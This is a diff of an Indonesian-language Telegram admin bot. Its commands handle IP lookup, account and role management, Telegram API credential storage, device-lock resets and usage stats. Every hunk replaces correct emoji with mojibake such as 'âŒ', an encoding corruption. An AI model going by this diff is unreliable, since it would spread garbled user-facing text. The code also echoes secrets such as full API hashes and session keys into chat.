@@ -16611,20 +16627,20 @@ bot.onText(/^\/?trackip (.+)/, async (msg, match) => {
     const ip = match[1].trim();
 
     if (msg.from.id !== OWNER_ID) {
-        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
+        return bot.sendMessage(chatId, "âŒ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
     }
 
     if (!/^(?:\d{1,3}\.){3}\d{1,3}$/.test(ip) && !/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(ip)) {
-        return bot.sendMessage(chatId, "⚠️ Format IP / domain tidak valid.\n\nContoh:\n`/trackip 8.8.8.8`\n`/trackip google.com`", { parse_mode: "Markdown" });
+        return bot.sendMessage(chatId, "âš ï¸ Format IP / domain tidak valid.\n\nContoh:\n`/trackip 8.8.8.8`\n`/trackip google.com`", { parse_mode: "Markdown" });
     }
 
-    await bot.sendMessage(chatId, "🔍 Sedang melacak informasi IP...");
+    await bot.sendMessage(chatId, "ðŸ” Sedang melacak informasi IP...");
 
     try {
         const { data } = await axios.get(`https://ipapi.co/${ip}/json/`);
 
         if (data.error) {
-            return bot.sendMessage(chatId, `❌ Gagal melacak IP: ${data.reason || "tidak ditemukan."}`);
+            return bot.sendMessage(chatId, `âŒ Gagal melacak IP: ${data.reason || "tidak ditemukan."}`);
         }
 
         const info = `
@@ -16649,8 +16665,8 @@ Database: ${data.asn || "-"}
         }
 
     } catch (err) {
-        console.error("❌ Error trackip:", err.message);
-        bot.sendMessage(chatId, "❌ Gagal mengambil data IP, coba lagi nanti.");
+        console.error("âŒ Error trackip:", err.message);
+        bot.sendMessage(chatId, "âŒ Gagal mengambil data IP, coba lagi nanti.");
     }
 });
 
@@ -16714,19 +16730,19 @@ function doReset(role) {
 
 function registerResetButton(cmd, role) {
     bot.onText(new RegExp(`^\\/?${cmd}$`, "i"), async (msg) => {
-        if (msg.from.id !== OWNER_ID) return bot.sendMessage(msg.chat.id, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
+        if (msg.from.id !== OWNER_ID) return bot.sendMessage(msg.chat.id, "âŒ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
 
         const roleName = role === "all" ? "SEMUA AKUN" : `role *${role}*`;
         const opts = {
             parse_mode: "Markdown",
             reply_markup: {
                 inline_keyboard: [
-                    [{ text: "✅ Konfirmasi", callback_data: `confirm_${cmd}` }],
-                    [{ text: "❌ Batal", callback_data: "cancel_reset" }]
+                    [{ text: "âœ… Konfirmasi", callback_data: `confirm_${cmd}` }],
+                    [{ text: "âŒ Batal", callback_data: "cancel_reset" }]
                 ]
             }
         };
-        bot.sendMessage(msg.chat.id, `⚠️ Apakah kamu yakin ingin menghapus ${roleName}?`, opts);
+        bot.sendMessage(msg.chat.id, `âš ï¸ Apakah kamu yakin ingin menghapus ${roleName}?`, opts);
     });
 
 
@@ -16737,14 +16753,14 @@ function registerResetButton(cmd, role) {
 
         if (data === `confirm_${cmd}`) {
             if (fromId !== OWNER_ID) {
-                return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true });
+                return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil ðŸ˜Ž", show_alert: true });
             }
 
             const deleted = doReset(role);
-            const info = deleted.length > 0 ? `✅ ${deleted.length} akun dihapus.` : "ℹ️ Tidak ada akun yang dihapus.";
+            const info = deleted.length > 0 ? `âœ… ${deleted.length} akun dihapus.` : "â„¹ï¸ Tidak ada akun yang dihapus.";
 
             await bot.sendDocument(chatId, "reset_result.txt", {
-                caption: `*Berhasil menghapus ${deleted.length} akun*\n${role === "all" ? "🗑 Semua akun" : `🗑 Role: ${role}`}`,
+                caption: `*Berhasil menghapus ${deleted.length} akun*\n${role === "all" ? "ðŸ—‘ Semua akun" : `ðŸ—‘ Role: ${role}`}`,
                 parse_mode: "Markdown"
             });
             return bot.answerCallbackQuery(query.id, { text: info });
@@ -16752,10 +16768,10 @@ function registerResetButton(cmd, role) {
 
         if (data === "cancel_reset") {
             if (fromId !== OWNER_ID) {
-                return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true });
+                return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil ðŸ˜Ž", show_alert: true });
             }
-            bot.answerCallbackQuery(query.id, { text: "❌ Dibatalkan." });
-            bot.sendMessage(chatId, "🚫 Aksi reset dibatalkan.");
+            bot.answerCallbackQuery(query.id, { text: "âŒ Dibatalkan." });
+            bot.sendMessage(chatId, "ðŸš« Aksi reset dibatalkan.");
         }
     });
 }
@@ -16774,14 +16790,14 @@ bot.onText(/^\/addtqto$/i, async (msg) => {
     const chatType = msg.chat.type
 
     if (chatType !== "private") {
-        return bot.sendMessage(chatId, "❌ Gunakan perintah ini di private chat.")
+        return bot.sendMessage(chatId, "âŒ Gunakan perintah ini di private chat.")
     }
     const config = loadTelegramConfig()
     const isOwner = config.ownerList.includes(fromId)
     const role = await getUserRoleFromGroups(fromId)
 
     if (!isOwner && role !== "OWNER") {
-        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin.")
+        return bot.sendMessage(chatId, "âŒ Kamu tidak memiliki izin.")
     }
 
     ADD_TQTO_STATE[fromId] = {
@@ -16789,7 +16805,7 @@ bot.onText(/^\/addtqto$/i, async (msg) => {
         data: {}
     }
 
-    bot.sendMessage(chatId, "📌 Masukkan NAMA contributor:", {
+    bot.sendMessage(chatId, "ðŸ“Œ Masukkan NAMA contributor:", {
         parse_mode: "Markdown"
     })
 })
@@ -16807,18 +16823,18 @@ bot.onText(/^\/uprole (.+)$/i, async (msg, match) => {
     const chatId = msg.chat.id;
     const fromId = msg.from.id;
 
-    if (fromId !== OWNER_ID) return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin.");
-    if (!match[1]) return bot.sendMessage(chatId, "❌ Format salah.\nGunakan: /uprole <username> <role>");
+    if (fromId !== OWNER_ID) return bot.sendMessage(chatId, "âŒ Kamu tidak memiliki izin.");
+    if (!match[1]) return bot.sendMessage(chatId, "âŒ Format salah.\nGunakan: /uprole <username> <role>");
 
     const args = match[1].trim().split(/\s+/);
-    if (args.length < 2) return bot.sendMessage(chatId, "❌ Format salah.\nGunakan: /uprole <username> <role>");
+    if (args.length < 2) return bot.sendMessage(chatId, "âŒ Format salah.\nGunakan: /uprole <username> <role>");
 
     const username = args.shift();
     const newRole = args.join("_").toUpperCase();
 
     const db = loadDatabase();
     const user = db.find(u => u.username === username);
-    if (!user) return bot.sendMessage(chatId, "❌ Username tidak ditemukan.");
+    if (!user) return bot.sendMessage(chatId, "âŒ Username tidak ditemukan.");
 
     const oldRole = user.role;
     user.role = newRole;
@@ -16826,11 +16842,11 @@ bot.onText(/^\/uprole (.+)$/i, async (msg, match) => {
     await safeSaveDatabase(db);
 
     return bot.sendMessage(chatId, `
-✅ <b>ROLE BERHASIL DIUBAH</b>
+âœ… <b>ROLE BERHASIL DIUBAH</b>
 
-👤 <b>${username}</b>
-🎯 ${oldRole.toUpperCase()} ➜ ${newRole}
-⏳ Expired: ${formatDateExp(user.expiredDate)}
+ðŸ‘¤ <b>${username}</b>
+ðŸŽ¯ ${oldRole.toUpperCase()} âžœ ${newRole}
+â³ Expired: ${formatDateExp(user.expiredDate)}
 `, { parse_mode: "HTML" });
 });
 bot.onText(/^\/accrole\s+(.+)$/i, (msg, match) => {
@@ -16838,27 +16854,27 @@ bot.onText(/^\/accrole\s+(.+)$/i, (msg, match) => {
     const fromId = msg.from.id;
 
     if (fromId !== OWNER_ID) {
-        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin.");
+        return bot.sendMessage(chatId, "âŒ Kamu tidak memiliki izin.");
     }
 
     const input = match[1].trim();
     if (!input.includes(",")) {
         return bot.sendMessage(
             chatId,
-            "❌ Format salah.\nGunakan:\n/accrole username,password"
+            "âŒ Format salah.\nGunakan:\n/accrole username,password"
         );
     }
 
     const [username, password] = input.split(",").map(v => v.trim());
     if (!username || !password) {
-        return bot.sendMessage(chatId, "❌ Username atau password kosong.");
+        return bot.sendMessage(chatId, "âŒ Username atau password kosong.");
     }
 
     const db = loadDatabase();
 
 
     if (db.find(u => u.username === username)) {
-        return bot.sendMessage(chatId, "❌ Username sudah terdaftar.");
+        return bot.sendMessage(chatId, "âŒ Username sudah terdaftar.");
     }
 
 
@@ -16877,12 +16893,12 @@ bot.onText(/^\/accrole\s+(.+)$/i, (msg, match) => {
 
     bot.sendMessage(
         chatId,
-        `✅ AKUN REVIEW BERHASIL DIBUAT\n\n` +
-        `👤 Username : ${username}\n` +
-        `🔑 Password : ${password}\n` +
-        `🔒 Role     : REVIEW\n` +
-        `⏳ Expired  : ${formatDateExp(expiredDate)}\n\n` +
-        `⚠️ Akun ini READ-ONLY\nTidak bisa menggunakan API apa pun.`
+        `âœ… AKUN REVIEW BERHASIL DIBUAT\n\n` +
+        `ðŸ‘¤ Username : ${username}\n` +
+        `ðŸ”‘ Password : ${password}\n` +
+        `ðŸ”’ Role     : REVIEW\n` +
+        `â³ Expired  : ${formatDateExp(expiredDate)}\n\n` +
+        `âš ï¸ Akun ini READ-ONLY\nTidak bisa menggunakan API apa pun.`
     );
 });
 const ITEMS_PER_PAGE = 5;
@@ -16892,12 +16908,12 @@ bot.onText(/^\/listtqto$/i, (msg) => {
     const chatId = msg.chat.id;
     const fromId = msg.from.id;
 
-    if (fromId !== OWNER_ID) return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin.");
+    if (fromId !== OWNER_ID) return bot.sendMessage(chatId, "âŒ Kamu tidak memiliki izin.");
 
     const db = loadContributors();
     const list = db.contributors;
 
-    if (!list.length) return bot.sendMessage(chatId, "📭 Belum ada contributor.");
+    if (!list.length) return bot.sendMessage(chatId, "ðŸ“­ Belum ada contributor.");
 
     const key = `${chatId}_${fromId}`;
     activePages[key] = { page: 0, list };
@@ -16914,17 +16930,17 @@ function sendListPage(chatId, userId) {
     const end = start + ITEMS_PER_PAGE;
     const pageItems = data.list.slice(start, end);
 
-    let text = "📜 *DAFTAR TEAM MANTA*\n\n";
+    let text = "ðŸ“œ *DAFTAR TEAM MANTA*\n\n";
 
     pageItems.forEach((c, i) => {
         text += `*${start + i + 1}.* ${c.nama}\n`;
-        text += `   ├ Telegram : @${c.telegram}\n`;
-        text += `   └ Role     : ${c.role}\n\n`;
+        text += `   â”œ Telegram : @${c.telegram}\n`;
+        text += `   â”” Role     : ${c.role}\n\n`;
     });
 
     const buttons = [];
-    if (data.page > 0) buttons.push({ text: "⬅️ Back", callback_data: `listtqto_back_${key}` });
-    if (end < data.list.length) buttons.push({ text: "Next ➡️", callback_data: `listtqto_next_${key}` });
+    if (data.page > 0) buttons.push({ text: "â¬…ï¸ Back", callback_data: `listtqto_back_${key}` });
+    if (end < data.list.length) buttons.push({ text: "Next âž¡ï¸", callback_data: `listtqto_next_${key}` });
 
     bot.sendMessage(chatId, text, {
         parse_mode: "Markdown",
@@ -16957,11 +16973,11 @@ function generatePageText(data) {
     const end = start + ITEMS_PER_PAGE;
     const pageItems = data.list.slice(start, end);
 
-    let text = "📜 *DAFTAR TEAM MANTA*\n\n";
+    let text = "ðŸ“œ *DAFTAR TEAM MANTA*\n\n";
     pageItems.forEach((c, i) => {
         text += `*${start + i + 1}.* ${c.nama}\n`;
-        text += `   ├ Telegram : @${c.telegram}\n`;
-        text += `   └ Role     : ${c.role}\n\n`;
+        text += `   â”œ Telegram : @${c.telegram}\n`;
+        text += `   â”” Role     : ${c.role}\n\n`;
     });
     return text;
 }
@@ -16970,8 +16986,8 @@ function generateButtons(data, key) {
     const start = data.page * ITEMS_PER_PAGE;
     const end = start + ITEMS_PER_PAGE;
     const buttons = [];
-    if (data.page > 0) buttons.push({ text: "⬅️ Back", callback_data: `listtqto_back_${key}` });
-    if (end < data.list.length) buttons.push({ text: "Next ➡️", callback_data: `listtqto_next_${key}` });
+    if (data.page > 0) buttons.push({ text: "â¬…ï¸ Back", callback_data: `listtqto_back_${key}` });
+    if (end < data.list.length) buttons.push({ text: "Next âž¡ï¸", callback_data: `listtqto_next_${key}` });
     return [buttons];
 }
 bot.onText(/^\/deltqto\s+(\d+)$/i, (msg, match) => {
@@ -16979,14 +16995,14 @@ bot.onText(/^\/deltqto\s+(\d+)$/i, (msg, match) => {
     const fromId = msg.from.id;
 
     if (fromId !== OWNER_ID) {
-        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin.");
+        return bot.sendMessage(chatId, "âŒ Kamu tidak memiliki izin.");
     }
 
     const index = parseInt(match[1]) - 1;
     const db = loadContributors();
 
     if (index < 0 || index >= db.contributors.length) {
-        return bot.sendMessage(chatId, "❌ Nomor contributor tidak valid.");
+        return bot.sendMessage(chatId, "âŒ Nomor contributor tidak valid.");
     }
 
     const removed = db.contributors.splice(index, 1)[0];
@@ -16994,7 +17010,7 @@ bot.onText(/^\/deltqto\s+(\d+)$/i, (msg, match) => {
 
     bot.sendMessage(
         chatId,
-        `🗑️ *Contributor dihapus!*\n\n👤 ${removed.nama}`,
+        `ðŸ—‘ï¸ *Contributor dihapus!*\n\nðŸ‘¤ ${removed.nama}`,
         { parse_mode: "Markdown" }
     );
 });
@@ -17036,12 +17052,12 @@ bot.onText(/^\/addapi$/i, async (msg) => {
     const fromId = msg.from.id;
 
     if (fromId !== OWNER_ID) {
-        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin.");
+        return bot.sendMessage(chatId, "âŒ Kamu tidak memiliki izin.");
     }
 
     ADD_API_STATE[fromId] = { step: "API_ID" };
 
-    bot.sendMessage(chatId, "📌 *Masukkan API_ID:*", {
+    bot.sendMessage(chatId, "ðŸ“Œ *Masukkan API_ID:*", {
         parse_mode: "Markdown",
     });
 });
@@ -17050,24 +17066,24 @@ bot.onText(/^\/listapi$/i, async (msg) => {
     const fromId = msg.from.id;
 
     if (fromId !== OWNER_ID) {
-        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin.");
+        return bot.sendMessage(chatId, "âŒ Kamu tidak memiliki izin.");
     }
 
     if (!fs.existsSync("apitele.json")) {
-        return bot.sendMessage(chatId, "❌ Tidak ada data API.");
+        return bot.sendMessage(chatId, "âŒ Tidak ada data API.");
     }
 
     const apiList = JSON.parse(fs.readFileSync("apitele.json"));
 
     if (apiList.length === 0) {
-        return bot.sendMessage(chatId, "📭 Daftar API kosong.");
+        return bot.sendMessage(chatId, "ðŸ“­ Daftar API kosong.");
     }
 
-    let text = "*📦 DAFTAR API PACKAGE*\n\n";
+    let text = "*ðŸ“¦ DAFTAR API PACKAGE*\n\n";
 
     apiList.forEach((api, i) => {
         text += `*${i + 1}. API_ID:* \`${api.apiId}\`\n`;
-        text += `*API_HASH:* \`${api.apiHash.slice(0, 6)}••••${api.apiHash.slice(-4)}\`\n\n`;
+        text += `*API_HASH:* \`${api.apiHash.slice(0, 6)}â€¢â€¢â€¢â€¢${api.apiHash.slice(-4)}\`\n\n`;
     });
 
     bot.sendMessage(chatId, text.trim(), { parse_mode: "Markdown" });
@@ -17077,20 +17093,20 @@ bot.onText(/^\/delapi$/i, async (msg) => {
     const fromId = msg.from.id;
 
     if (fromId !== OWNER_ID) {
-        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin.");
+        return bot.sendMessage(chatId, "âŒ Kamu tidak memiliki izin.");
     }
 
     if (!fs.existsSync("apitele.json")) {
-        return bot.sendMessage(chatId, "❌ Tidak ada data API.");
+        return bot.sendMessage(chatId, "âŒ Tidak ada data API.");
     }
 
     const apiList = JSON.parse(fs.readFileSync("apitele.json"));
 
     if (apiList.length === 0) {
-        return bot.sendMessage(chatId, "📭 Tidak ada API untuk dihapus.");
+        return bot.sendMessage(chatId, "ðŸ“­ Tidak ada API untuk dihapus.");
     }
 
-    let text = "*🗑️ PILIH API YANG AKAN DIHAPUS*\n\n";
+    let text = "*ðŸ—‘ï¸ PILIH API YANG AKAN DIHAPUS*\n\n";
     apiList.forEach((api, i) => {
         text += `*${i + 1}.* API_ID: \`${api.apiId}\`\n`;
     });
@@ -17114,14 +17130,14 @@ bot.on("message", (msg) => {
         case "NAMA":
             state.data.nama = text;
             state.step = "TELEGRAM";
-            return bot.sendMessage(chatId, "📌 Masukkan *username Telegram* (tanpa @):", {
+            return bot.sendMessage(chatId, "ðŸ“Œ Masukkan *username Telegram* (tanpa @):", {
                 parse_mode: "Markdown",
             });
 
         case "TELEGRAM":
             state.data.telegram = text.replace("@", "");
             state.step = "ROLE";
-            return bot.sendMessage(chatId, "📌 Masukkan *ROLE* (Owner / Dev / UI):", {
+            return bot.sendMessage(chatId, "ðŸ“Œ Masukkan *ROLE* (Owner / Dev / UI):", {
                 parse_mode: "Markdown",
             });
 
@@ -17130,7 +17146,7 @@ bot.on("message", (msg) => {
             state.step = "AVATAR";
             return bot.sendMessage(
                 chatId,
-                "📌 Masukkan *Avatar URL* (atau ketik `skip`):",
+                "ðŸ“Œ Masukkan *Avatar URL* (atau ketik `skip`):",
                 { parse_mode: "Markdown" }
             );
 
@@ -17145,7 +17161,7 @@ bot.on("message", (msg) => {
             db.contributors.push(state.data);
             saveContributors(db);
 
-            bot.sendMessage(chatId, "✅ *Contributor berhasil ditambahkan!*", {
+            bot.sendMessage(chatId, "âœ… *Contributor berhasil ditambahkan!*", {
                 parse_mode: "Markdown",
             });
 
@@ -17166,13 +17182,13 @@ bot.on("message", async (msg) => {
 
     if (state.step === "API_ID") {
         if (!/^\d+$/.test(text)) {
-            return bot.sendMessage(chatId, "❌ API_ID harus angka.");
+            return bot.sendMessage(chatId, "âŒ API_ID harus angka.");
         }
 
         state.apiId = Number(text);
         state.step = "API_HASH";
 
-        return bot.sendMessage(chatId, "📌 *Masukkan API_HASH:*", {
+        return bot.sendMessage(chatId, "ðŸ“Œ *Masukkan API_HASH:*", {
             parse_mode: "Markdown",
         });
     }
@@ -17182,7 +17198,7 @@ bot.on("message", async (msg) => {
         const apiHash = text.trim();
 
         if (apiHash.length < 20) {
-            return bot.sendMessage(chatId, "❌ API_HASH tidak valid.");
+            return bot.sendMessage(chatId, "âŒ API_HASH tidak valid.");
         }
 
         let apiList = [];
@@ -17204,14 +17220,14 @@ bot.on("message", async (msg) => {
 
         return bot.sendMessage(
             chatId,
-            `✅ *API berhasil ditambahkan!*\n\nAPI_ID: \`${state.apiId}\`\nAPI_HASH: \`${apiHash}\``,
+            `âœ… *API berhasil ditambahkan!*\n\nAPI_ID: \`${state.apiId}\`\nAPI_HASH: \`${apiHash}\``,
             { parse_mode: "Markdown" }
         );
     }
 
     if (DEL_API_STATE[fromId]) {
         if (!/^\d+$/.test(text)) {
-            return bot.sendMessage(chatId, "❌ Masukkan nomor yang valid.");
+            return bot.sendMessage(chatId, "âŒ Masukkan nomor yang valid.");
         }
 
         const index = Number(text) - 1;
@@ -17219,7 +17235,7 @@ bot.on("message", async (msg) => {
         let apiList = JSON.parse(fs.readFileSync("apitele.json"));
 
         if (index < 0 || index >= apiList.length) {
-            return bot.sendMessage(chatId, "❌ Nomor API tidak ditemukan.");
+            return bot.sendMessage(chatId, "âŒ Nomor API tidak ditemukan.");
         }
 
         const removed = apiList.splice(index, 1)[0];
@@ -17233,7 +17249,7 @@ bot.on("message", async (msg) => {
 
         return bot.sendMessage(
             chatId,
-            `✅ API berhasil dihapus\n\nAPI_ID: \`${removed.apiId}\``,
+            `âœ… API berhasil dihapus\n\nAPI_ID: \`${removed.apiId}\``,
             { parse_mode: "Markdown" }
         );
     }
@@ -17245,14 +17261,14 @@ bot.onText(/^\/?info\s+(\S+)/i, async (msg, match) => {
 
     const allowedIds = [OWNER_ID, 7027155167, 6252224704];
     if (!allowedIds.includes(fromId)) {
-        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
+        return bot.sendMessage(chatId, "âŒ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
     }
 
     const username = match[1].trim().toLowerCase();
 
     try {
-        if (!fs.existsSync("database.json")) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
-        if (!fs.existsSync("keyList.json")) return bot.sendMessage(chatId, "❌ File keyList.json tidak ditemukan.");
+        if (!fs.existsSync("database.json")) return bot.sendMessage(chatId, "âŒ File database.json tidak ditemukan.");
+        if (!fs.existsSync("keyList.json")) return bot.sendMessage(chatId, "âŒ File keyList.json tidak ditemukan.");
 
         const db = JSON.parse(fs.readFileSync("database.json"));
         const keys = JSON.parse(fs.readFileSync("keyList.json"));
@@ -17262,7 +17278,7 @@ bot.onText(/^\/?info\s+(\S+)/i, async (msg, match) => {
         const keyUser = keys.find(k => (k.username || "").toLowerCase() === username);
 
         if (!dbUser && !keyUser) {
-            return bot.sendMessage(chatId, `❌ Akun *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
+            return bot.sendMessage(chatId, `âŒ Akun *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
         }
 
 
@@ -17300,7 +17316,7 @@ bot.onText(/^\/?info\s+(\S+)/i, async (msg, match) => {
 *Android ID:* ${android}
 *Session Key:* \`${session}\`
 
-*── Info Kreator ──*
+*â”€â”€ Info Kreator â”€â”€*
 *Dibuat Oleh:* ${creatorName}
 *ID Telegram Kreator:* \`${creatorTgId}\`
 *ID Telegram User:* \`${userTgId}\`
@@ -17310,8 +17326,8 @@ bot.onText(/^\/?info\s+(\S+)/i, async (msg, match) => {
         await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });
 
     } catch (err) {
-        console.error("❌ Error info:", err);
-        bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengambil data akun.");
+        console.error("âŒ Error info:", err);
+        bot.sendMessage(chatId, "âŒ Terjadi kesalahan saat mengambil data akun.");
     }
 });
 
@@ -17322,19 +17338,19 @@ bot.onText(/^\/?delete\s+(\S+)/i, async (msg, match) => {
 
     const allowedIds = [OWNER_ID, 7027155167, 6252224704];
     if (!allowedIds.includes(fromId)) {
-        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
+        return bot.sendMessage(chatId, "âŒ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
     }
 
     const username = match[1].trim().toLowerCase();
 
     try {
-        if (!fs.existsSync("database.json")) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
+        if (!fs.existsSync("database.json")) return bot.sendMessage(chatId, "âŒ File database.json tidak ditemukan.");
 
         const db = JSON.parse(fs.readFileSync("database.json"));
         const index = db.findIndex(u => (u.username || "").toLowerCase() === username);
 
         if (index === -1) {
-            return bot.sendMessage(chatId, `❌ Akun *${username}* tidak ditemukan di database.`, { parse_mode: "Markdown" });
+            return bot.sendMessage(chatId, `âŒ Akun *${username}* tidak ditemukan di database.`, { parse_mode: "Markdown" });
         }
 
         const targetUser = db[index];
@@ -17363,11 +17379,11 @@ bot.onText(/^\/?delete\s+(\S+)/i, async (msg, match) => {
             `ID:${fromId} Deleted ${targetUser.username} via Telegram\n`
         );
 
-        bot.sendMessage(chatId, `✅ Akun *${targetUser.username}* berhasil dihapus!`, { parse_mode: "Markdown" });
+        bot.sendMessage(chatId, `âœ… Akun *${targetUser.username}* berhasil dihapus!`, { parse_mode: "Markdown" });
 
     } catch (err) {
-        console.error("❌ Error delete:", err);
-        bot.sendMessage(chatId, "❌ Terjadi kesalahan saat menghapus akun.");
+        console.error("âŒ Error delete:", err);
+        bot.sendMessage(chatId, "âŒ Terjadi kesalahan saat menghapus akun.");
     }
 });
 
@@ -17383,18 +17399,18 @@ bot.onText(/^\/?resetdevice\s+(\S+)/i, async (msg, match) => {
         const isOwner = ownerList.includes(fromId) || fromId === OWNER_ID || [7027155167, 6252224704].includes(fromId);
 
         if (!isOwner && role !== "TK" && role !== "PT" && role !== "RESELLER") {
-            return bot.sendMessage(chatId, "❌ Akses ditolak");
+            return bot.sendMessage(chatId, "âŒ Akses ditolak");
         }
 
         const db = loadDatabaseFresh();
         const user = db.find(u => u.username.toLowerCase() === username.toLowerCase());
 
         if (!user) {
-            return bot.sendMessage(chatId, `❌ Akun *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
+            return bot.sendMessage(chatId, `âŒ Akun *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
         }
 
         if (!isOwner && user.createdById !== fromId && user.createdBy !== msg.from.username) {
-            return bot.sendMessage(chatId, "❌ Kamu hanya bisa mereset device untuk akun yang kamu buat sendiri.");
+            return bot.sendMessage(chatId, "âŒ Kamu hanya bisa mereset device untuk akun yang kamu buat sendiri.");
         }
 
         if (fs.existsSync("keyList.json")) {
@@ -17413,10 +17429,10 @@ bot.onText(/^\/?resetdevice\s+(\S+)/i, async (msg, match) => {
             }
         }
 
-        bot.sendMessage(chatId, `✅ Device lock untuk akun *${user.username}* berhasil di-reset!\n\nSilakan suruh user login ulang di aplikasinya.`, { parse_mode: "Markdown" });
+        bot.sendMessage(chatId, `âœ… Device lock untuk akun *${user.username}* berhasil di-reset!\n\nSilakan suruh user login ulang di aplikasinya.`, { parse_mode: "Markdown" });
     } catch (err) {
-        console.error("❌ Error resetdevice:", err);
-        bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mereset device akun.");
+        console.error("âŒ Error resetdevice:", err);
+        bot.sendMessage(chatId, "âŒ Terjadi kesalahan saat mereset device akun.");
     }
 });
 bot.onText(/\/upback/i, async msg => {
@@ -17424,7 +17440,7 @@ bot.onText(/\/upback/i, async msg => {
     const userId = msg.from.id;
 
     if (userId !== OWNER_ID) {
-        return bot.sendMessage(chatId, "❌ Akses ditolak");
+        return bot.sendMessage(chatId, "âŒ Akses ditolak");
     }
 
     try {
@@ -17434,7 +17450,7 @@ bot.onText(/\/upback/i, async msg => {
             .reverse();
 
         if (!files.length) {
-            return bot.sendMessage(chatId, "❌ Tidak ada file backup");
+            return bot.sendMessage(chatId, "âŒ Tidak ada file backup");
         }
 
         const latest = path.join(BACKUP_DIR, files[0]);
@@ -17442,10 +17458,10 @@ bot.onText(/\/upback/i, async msg => {
         await bot.sendDocument(
             chatId,
             latest,
-            { caption: "📦 Backup database terbaru" }
+            { caption: "ðŸ“¦ Backup database terbaru" }
         );
     } catch (e) {
-        bot.sendMessage(chatId, "❌ Gagal upload backup");
+        bot.sendMessage(chatId, "âŒ Gagal upload backup");
     }
 });
 
@@ -17463,7 +17479,7 @@ bot.onText(/^\/?(stats|status)$/i, async (msg) => {
     const chatId = msg.chat.id;
 
     if (msg.from.id !== OWNER_ID) {
-        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
+        return bot.sendMessage(chatId, "âŒ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
     }
 
     try {
@@ -17494,16 +17510,16 @@ bot.onText(/^\/?(stats|status)$/i, async (msg) => {
 *Uptime:* ${getUptime()}
 
 *User Data*
-• Total User: ${totalUser}
-• Owner: ${owners}
-• Reseller: ${resellers}
-• VIP: ${vips}
-• Member: ${members}
+â€¢ Total User: ${totalUser}
+â€¢ Owner: ${owners}
+â€¢ Reseller: ${resellers}
+â€¢ VIP: ${vips}
+â€¢ Member: ${members}
 
 *WhatsApp Session*
-• Messenger: ${connectedMess}
-• Business: ${connectedBiz}
-• Active Numbers: ${connectedNumbers}
+â€¢ Messenger: ${connectedMess}
+â€¢ Business: ${connectedBiz}
+â€¢ Active Numbers: ${connectedNumbers}
 
 *Tanggal:* ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}
 `.trim();
@@ -17511,8 +17527,8 @@ bot.onText(/^\/?(stats|status)$/i, async (msg) => {
         await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });
 
     } catch (err) {
-        console.error("❌ Error stats:", err);
-        bot.sendMessage(chatId, "❌ Gagal mengambil data stats.");
+        console.error("âŒ Error stats:", err);
+        bot.sendMessage(chatId, "âŒ Gagal mengambil data stats.");
     }
 });
 
@@ -17520,17 +17536,17 @@ bot.onText(/^\/?statususer$/, async (msg) => {
     const chatId = msg.chat.id;
 
     if (msg.from.id !== OWNER_ID) {
-        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
+        return bot.sendMessage(chatId, "âŒ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
     }
 
     try {
         const dbPath = "./database.json";
         const logPath = "logUser.txt";
 
-        if (!fs.existsSync(dbPath)) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
+        if (!fs.existsSync(dbPath)) return bot.sendMessage(chatId, "âŒ File database.json tidak ditemukan.");
         const db = JSON.parse(fs.readFileSync(dbPath, "utf-8"));
 
-        if (!fs.existsSync(logPath)) return bot.sendMessage(chatId, "📊 Belum ada data log pembuatan akun.");
+        if (!fs.existsSync(logPath)) return bot.sendMessage(chatId, "ðŸ“Š Belum ada data log pembuatan akun.");
 
         const logs = fs.readFileSync(logPath, "utf-8").split("\n").filter(Boolean);
 
@@ -17555,7 +17571,7 @@ bot.onText(/^\/?statususer$/, async (msg) => {
         list.sort((a, b) => b.total - a.total);
 
 
-        let teks = `📊 STATUS USER & AKTIVITAS BOT\nGenerated: ${new Date().toLocaleString()}\n\n`;
+        let teks = `ðŸ“Š STATUS USER & AKTIVITAS BOT\nGenerated: ${new Date().toLocaleString()}\n\n`;
         teks += `Username | Role | Total Akun Dibuat\n`;
         teks += `-------------------------------------\n`;
 
@@ -17567,13 +17583,13 @@ bot.onText(/^\/?statususer$/, async (msg) => {
         fs.writeFileSync(filePath, teks);
 
         await bot.sendDocument(chatId, filePath, {
-            caption: "📄 Berikut status semua user & jumlah akun yang telah mereka buat."
+            caption: "ðŸ“„ Berikut status semua user & jumlah akun yang telah mereka buat."
         });
 
         fs.unlinkSync(filePath); // hapus file setelah dikirim
     } catch (err) {
